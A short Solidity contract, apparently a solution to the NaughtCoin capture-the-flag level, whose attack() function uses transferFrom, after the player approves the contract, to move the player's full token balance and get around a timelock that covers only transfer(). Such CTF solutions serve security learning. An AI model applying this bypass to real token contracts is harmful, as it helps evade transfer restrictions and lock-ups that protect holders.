// After approving the contracts account with the players address

pragma solidity ^0.8.0;

import "./Naughtcoin.sol";
contract attackNaughtCoin
{
    NaughtCoin _targetContract;

    constructor( address _deployedContractAddr) public{
        _targetContract = NaughtCoin(_deployedContractAddr);
    }

    function attack() public{
        _targetContract.transferFrom(msg.sender , address(this) ,_targetContract.balanceOf(msg.sender));
    }


}
